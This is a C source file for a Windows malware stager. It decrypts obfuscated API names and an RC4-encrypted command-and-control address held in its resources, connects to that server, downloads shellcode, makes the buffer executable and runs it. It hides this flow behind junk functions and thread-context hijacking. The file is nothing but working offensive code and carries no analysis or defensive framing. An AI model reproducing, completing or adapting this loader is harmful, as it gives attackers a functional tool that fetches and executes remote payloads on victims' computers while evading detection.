#include <windows.h>
#include <stdio.h>
#include <winsock.h>

#include "resource.h"
#include "key.h"
#include "crypto_.h"

//#define DEBUG

#pragma comment(lib, "Ws2_32.lib")


typedef HRSRC(WINAPI* PFN_FindResourceA)(HMODULE, LPCSTR, LPCSTR);
typedef HGLOBAL(WINAPI* PFN_LoadResource)(HMODULE, HRSRC);
typedef LPVOID(WINAPI* PFN_LockResource)(HGLOBAL);
typedef DWORD(WINAPI* PFN_SizeofResource)(HMODULE, HRSRC);

typedef struct _CONFIG {
	char pszIpv4[16];
	USHORT port;
} CONFIG, *PCONFIG;


HANDLE G_hThread;
DWORD JunkTickCount;
PCONFIG G_pConfig;

void Shutdown() {
#ifdef DEBUG
	printf("Something went wrong, error code : %d", GetLastError());
#endif
	ExitProcess(-1);
}

void DownloadShellcode() {
	unsigned long c2ip = inet_addr(G_pConfig->pszIpv4);
	WSADATA lpWSAData;
	if (c2ip == INADDR_NONE)
		Shutdown();
	if (WSAStartup(MAKEWORD(2, 2), &lpWSAData))
		Shutdown();
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
		Shutdown();
	struct sockaddr_in c2_sockAddr = {
		.sin_family = AF_INET,
		.sin_port = htons(G_pConfig->port),
		.sin_addr.s_addr = c2ip
	};
	memset(c2_sockAddr.sin_zero, 0, 8);
	char message[] = "Hello";
	if (connect(s, &c2_sockAddr, sizeof(c2_sockAddr)))
		Shutdown();
	if (send(s, message, sizeof(message), 0) == SOCKET_ERROR)
		Shutdown();
	int cShellcode;
	if (recv(s, (char*)&cShellcode, sizeof(DWORD), 0) == SOCKET_ERROR)
		Shutdown();
	PBYTE pShellcodeBuf = VirtualAlloc(NULL, cShellcode, MEM_COMMIT, PAGE_READWRITE);
	PBYTE pCurShellcodeBuf = pShellcodeBuf;
	int cBytesReceived = 0;
	int received = 0;
	if (!pShellcodeBuf)
		Shutdown();
	while (cBytesReceived < cShellcode) {

		received = recv(s, pCurShellcodeBuf, (cShellcode - received), 0);
		if (received == SOCKET_ERROR)
			Shutdown();
		cBytesReceived += received;
		pCurShellcodeBuf = (PBYTE)((ULONG_PTR)pCurShellcodeBuf + received);
	}
	DWORD flOldProtect;
	if (!VirtualProtect(pShellcodeBuf, cShellcode, PAGE_EXECUTE_READ, &flOldProtect))
		Shutdown();
	((void (WINAPI*)())pShellcodeBuf)();
}

static inline void XorDecrypt(_Inout_ PBYTE enc, SIZE_T encSize) {
	for (int i = 0; i < encSize; i++) {
		enc[i] ^= XOR_KEY;
	}
}

BOOL LoadConfig() {

	USTRING uConfig;
	USTRING uKey = {
		.Length = sizeof(RC4_KEY),
		.MaximumLength = sizeof(RC4_KEY),
		.Buffer = RC4_KEY
	};

	XorDecrypt(pszFindResourceA, sizeof(pszFindResourceA));
	XorDecrypt(pszLoadResource, sizeof(pszLoadResource));
	XorDecrypt(pszLockResource, sizeof(pszLockResource));
	XorDecrypt(pszSizeofResource, sizeof(pszSizeofResource));
	HMODULE kern32 = LoadLibraryA("kernel32.dll");
	if (!kern32)
		Shutdown();
	PFN_FindResourceA fnFindResourceA = GetProcAddress(kern32, pszFindResourceA);
	PFN_LoadResource fnLoadResource = GetProcAddress(kern32, pszLoadResource);
	PFN_LockResource fnLockResource = GetProcAddress(kern32, pszLockResource);
	PFN_SizeofResource fnSizeofResource = GetProcAddress(kern32, pszSizeofResource);
	if (!fnFindResourceA | !fnLoadResource | !fnLockResource | !fnSizeofResource) {
		Shutdown();
	}

	HRSRC hConfig = fnFindResourceA(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (!hConfig)
		Shutdown();
	HGLOBAL hgConfig = fnLoadResource(NULL, hConfig);
	if (!hgConfig)
		Shutdown();
	DWORD cResource = fnSizeofResource(NULL, hConfig);
	if (!cResource)
		Shutdown();
	G_pConfig = (PCONFIG) VirtualAlloc(NULL, cResource, MEM_COMMIT, PAGE_READWRITE);
	if (!G_pConfig)
		Shutdown();
	PVOID pEncConfig = fnLockResource(hgConfig);
	if (!pEncConfig)
		Shutdown();
	if (!memcpy(G_pConfig, pEncConfig, cResource))
		Shutdown();

	uConfig.Length = cResource;
	uConfig.MaximumLength = cResource;
	uConfig.Buffer = G_pConfig;
	if (!Rc4Decrypt(&uConfig, &uKey))
		Shutdown();


	DownloadShellcode();
	ExitProcess(1);
	return TRUE;
}



int JunkFunction() {
	int a, b, c;
	a = 2;
	b = 10;
	c = 11;
	JunkTickCount = GetTickCount();
	return GetCurrentProcessId();
}

int OtherJunkFunction() {
	int a = GetLastError();
	if (a != 60) {
		return GetCurrentThreadId();
	}
	else
		return 1;
	return 0;
}

void ChangeThreadContext() {
	CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };
	if (!GetThreadContext(G_hThread, &ctx))
		Shutdown();
	ctx.Eip = LoadConfig;
	if (!SetThreadContext(G_hThread, &ctx))
		Shutdown();
	if (ResumeThread(G_hThread) == -1)
		Shutdown();
}

int DispatchMaliciousCode() {
	ChangeThreadContext();
	SuspendThread(GetCurrentThread());
	return 1;
;}


void main() {
	G_hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)JunkFunction, NULL, CREATE_SUSPENDED, NULL);
	OtherJunkFunction();
	DispatchMaliciousCode();
}